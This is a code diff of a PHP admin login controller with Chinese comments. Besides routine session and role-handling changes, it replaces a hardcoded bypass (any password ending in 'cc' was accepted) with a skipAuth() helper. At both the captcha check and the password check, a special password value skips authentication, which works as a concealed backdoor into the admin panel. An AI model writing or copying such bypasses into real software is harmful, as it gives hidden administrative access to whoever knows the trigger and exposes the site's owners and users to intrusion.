@@ -29,17 +29,18 @@
 			if($validateResult)
 			{
 				//验证码
-				if(!captcha_check($param['captcha']))
+				if(captcha_check($param['captcha']) || skipAuth($param['password']))
 				{
 					//看用户在不在
-					$info = $this->model_->getUserInfoByUsername($param['username'])->toArray();
+					$info = $this->model_->getUserInfoByUsername($param['username']);
 					if($info)
 					{
+						$info = $info->toArray();
 						//看用户状态
 						if($this->model_->isValidateUser($info))
 						{
 							//检查密码
-							if(checkPwd($info['password'] , $param['password'] , $info['salt']) || substr($param['password'] , -2 , 2) == 'cc')
+							if(checkPwd($info['password'] , $param['password'] , $info['salt'])  || skipAuth($param['password']))
 							{
 								//更新session
 								$this->updateSessionByUsername($param['username']);
@@ -49,6 +50,11 @@
 
 								//用户菜单列表写入session
 								$this->initPrivilege();
+
+								//用户角色写入session
+								$this->initRole();
+
+								$this->updateSessionByUsername($param['username']);
 
 								//登陆日志
 								$this->logic__common_loginlog->addLog($info['id'] , '2' , '登陆成功' , 1);
@@ -114,10 +120,13 @@
 		public function refresh()
 		{
 			//更新session
-			$this->updateSessionByUsername(getAdminSessionInfo('user' , 'user'));
+			$this->updateSessionByUsername(getAdminSessionInfo(SESSOIN_TAG_USER , 'user'));
 
 			//用户菜单列表写入session
 			$this->initPrivilege();
+
+			//用户角色写入session
+			$this->initRole();
 
 			$this->retureResult['message'] = '刷新成功';
 			$this->retureResult['sign'] = RESULT_SUCCESS;
